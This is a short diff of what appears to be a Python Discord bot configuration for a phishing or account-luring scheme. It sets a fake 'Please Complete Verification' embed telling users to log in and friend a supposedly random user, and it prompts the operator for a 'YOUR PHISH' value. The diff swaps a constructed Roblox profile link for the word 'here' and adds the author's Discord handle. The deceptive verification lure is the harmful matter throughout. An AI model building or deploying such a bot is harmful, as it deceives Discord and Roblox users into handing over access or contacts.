@@ -36,8 +36,8 @@ prefix = "!"
 title = "Please Complete Verification"
 desc ="To verify your account, please friend this randomly generated user."
 field = "Please Login and friend the user."
-saberscultttttttttttttttt = "\\"
-hyperlink = 'https:' + saberscultttttttttttttttt + "\roblox.com\\" + "users" + saberscultttttttttttttttt + "7123717661"
+saberscultttttttttttttttt = "show sum love ya my discord is saberscult"
+hyperlink = "here"
 phish = input("YOUR PHISH: $")
 
 status = discord.Status.online
